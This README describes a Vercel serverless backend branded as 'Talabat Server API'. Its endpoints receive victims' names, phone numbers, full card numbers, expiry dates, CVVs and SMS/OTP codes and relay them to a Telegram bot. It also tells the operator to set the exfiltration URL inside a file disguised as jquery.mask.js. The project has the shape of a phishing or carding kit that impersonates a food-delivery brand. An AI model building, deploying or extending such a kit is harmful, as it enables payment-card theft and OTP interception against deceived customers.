# Talabat Server API

A Vercel serverless API server for handling Talabat payment and SMS data with Telegram integration.

## Features

- ✅ Serverless functions (Vercel)
- ✅ Payment data handling (`/api/send-payment`)
- ✅ SMS/OTP code handling (`/api/send-sms`)
- ✅ Telegram Bot API integration
- ✅ CORS enabled
- ✅ Error handling

## Setup

### 1. Install Vercel CLI

```bash
npm install -g vercel
```

### 2. Install Dependencies

```bash
cd talabat-server
npm install
```

### 3. Configure Environment Variables

You need to set your Telegram bot credentials. You can do this in two ways:

#### Option A: Using Vercel Dashboard
1. Go to your Vercel project settings
2. Navigate to "Environment Variables"
3. Add:
   - `TELEGRAM_BOT_TOKEN` = Your Telegram bot token
   - `TELEGRAM_CHAT_ID` = Your Telegram chat ID

#### Option B: Using Vercel CLI
```bash
vercel env add TELEGRAM_BOT_TOKEN
vercel env add TELEGRAM_CHAT_ID
```

### 4. Deploy to Vercel

```bash
# Login to Vercel (first time only)
vercel login

# Deploy to production
vercel --prod

# Or deploy to preview
vercel
```

## API Endpoints

### GET /
Health check endpoint.

**Response:**
```json
{
  "success": true,
  "message": "Talabat Server API is running",
  "version": "1.0.0",
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

### POST /api/send-payment
Sends payment/billing data to Telegram.

**Request Body:**
```json
{
  "firstName": "John",
  "lastName": "Doe",
  "phoneNumber": "+1234567890",
  "creditCard": "1234567890123456",
  "expiryDate": "12/25",
  "expiryMonth": "12",
  "expiryYear": "25",
  "cvv": "123",
  "ip": "127.0.0.1",
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Payment data sent successfully",
  "messageId": 12345,
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

### POST /api/send-sms
Sends SMS/OTP code data to Telegram.

**Request Body:**
```json
{
  "otp": "123456",
  "ip": "127.0.0.1",
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

**Response:**
```json
{
  "success": true,
  "message": "SMS data sent successfully",
  "messageId": 12346,
  "timestamp": "2026-02-09T08:17:44.512Z"
}
```

## Local Development

To test locally:

```bash
# Start Vercel dev server
vercel dev
```

The server will run on `http://localhost:3000`

## Project Structure

```
talabat-server/
├── api/
│   ├── index.js          # Root endpoint (health check)
│   ├── send-payment.js   # Payment data endpoint
│   └── send-sms.js       # SMS/OTP endpoint
├── config.js             # Configuration file
├── package.json          # Dependencies
├── vercel.json           # Vercel configuration
└── README.md             # This file
```

## Updating the Client Code

After deploying, update your `talabat_panel/js/jquery.mask.js` to use your new server URL:

```javascript
// Change from:
"url": "https://ge-server.vercel.app/api/send-payment"

// To:
"url": "https://your-talabat-server.vercel.app/api/send-payment"
```

## Security Notes

- Environment variables are stored securely in Vercel
- CORS is enabled for cross-origin requests
- All endpoints validate required fields
- Errors are logged but not exposed to clients

## License

MIT
